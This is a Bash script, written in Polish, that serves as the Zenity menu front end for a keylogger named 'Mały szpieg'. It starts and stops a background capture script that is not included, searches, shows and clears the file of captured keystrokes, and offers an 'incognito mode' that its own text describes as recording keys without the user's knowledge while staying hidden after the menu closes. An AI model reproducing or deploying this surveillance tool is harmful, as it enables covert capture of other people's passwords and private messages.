#!/bin/bash
# Author           : Bartosz Łuczak ( bartosz.luczak0@gmail.com )
# Created On       : 15.04.2017
# Last Modified By : Bartosz Łuczak (bartosz.luczak0@gmail.com)
# Last Modified On : 19.04.2017
# Version          : v.0.9.2
#
# Description      : Mały szpieg (Keylogger)
# Opis
#
# Licensed under GPL (see /usr/share/common-licenses/GPL for more details
# or contact # the Free Software Foundation for a copy)


incognito(){
		zenity --info --title "Tryb incognito" --text "Tryb incognito pozwala na rejestrowanie wcisnietych klawiszy bez wiedzy uzytkownika. \nPo zdecydowaniu sie na te opcje program zostanie wylaczony, a szpieg nadal bedzie dzialal. \nAby go wylaczyc nalezy ponownie uruchomic program i wybrac opcje STOP."
		if zenity --question --title "Tryb incognito" --text "Czy na pewno chcesz uruchomic tryb incognito?"; then
			if [ "$SZPIEG" = "wylaczony" ];then	
			sh szpieg.sh & 
			fi
		zenity --info --title "Udalo sie!" --text "Uruchomiono tryb incognito. Program zostanie zamkniety!"
		break
		fi
}


wyczysc(){
		if zenity --question --title "Czyszcenie pliku" --text "Czy na pewno chcesz wyczyścic plik z zapisanymi klawiszami?"; then	
			echo -n > wyjscie.txt
			zenity --info --title "Udalo sie!" --text "Wyczyszczono plik wynikowy!"
		fi
}

szukaj(){
		KLUCZ=$(zenity --entry --title "Szukaj" --text "Podaj wyrazenie ktorego szukasz:")
		sed 's: ::g' wyjscie.txt |
	        grep $KLUCZ |
		zenity --text-info --height 400 --width 500 --title "Wyszukane slowa: "
}

otworz(){
		cat wyjscie.txt |
			zenity --text-info --height 400 --width 500 --title "Zapis: "
}


pomoc(){
 echo "Opcje :"
 echo "-h           - pomoc "
 echo "-v           - wersja "
 echo "-i	    - odpal program w trybie incognito"
 echo "-b	    - przerywa tryb szpiega(jesli dziala w trybie incognito)"
}

#OPCJE DODATKOWE


while getopts hibv WYBOR 2>/dev/null
    do
	case $WYBOR in
	    h) pomoc
	       exit;;
	    v) echo "Wersja programu: 0.9.2"
	       exit;;
	    i) sh szpieg.sh & 
	       exit;;
	    b) kill $(ps aux | grep 'sh szpieg' )
	       exit;;
	    ?) echo "Nieprawidłowa opcja, wpisz -h w celu uzyskania pomocy."
	       exit;;
	esac	
    done


SZPIEG=wylaczony
menu=("Wyszukaj slowa" "Otworz plik z przechwyconymi klawiszami" "Wyczysc plik z przechwyconymi klawiszami" "Start" "Stop" "Tryb incognito" "Koniec")

#GŁÓWNA PĘTLA PROGRAMU - MENU ZENITY
while [ "$opt" != "Koniec" ]
do
	opt=$(zenity --list --column=Menu "${menu[@]}" --height 400 --width 400 --title "Maly szpieg by Bartosz Łuczak" --text "Witaj w Malym Szpiegu. Wybierz jedna z opcji! Aktualnie tryb szpiega jest $SZPIEG"  )

	if [ "$opt" = "Wyszukaj slowa" ]; then
		#szukamy slow które nas interesują
		szukaj

	elif [ "$opt" = "Otworz plik z przechwyconymi klawiszami" ]; then
		#otwiera plik wynikowy
		otworz

	elif [ "$opt" = "Wyczysc plik z przechwyconymi klawiszami" ]; then
		#czyscimy plik wynikowy
		wyczysc
	elif [ "$opt" = "Start" ]; then
		SZPIEG=wlaczony
		#uruchamiamy skrypt śledzący w tle
		sh szpieg.sh & 

	elif [ "$opt" = "Stop" ]; then
		SZPIEG=wylaczony
		#wyłączamy proces szpiega
	   	kill $(ps aux | grep 'sh szpieg' )

	elif [ "$opt" = "Tryb incognito" ]; then
		#tryb incognito
		incognito

	elif [ "$opt" = "Koniec" ]; then
		#na wypadek, gdyby uzytkownik zapomnial o wyłączeniu szpiega, coby nie działał w tle
		#a do tego mamy tryb incognito :)
	   	kill $(ps aux | grep 'sh szpieg') 
		break
	fi

done
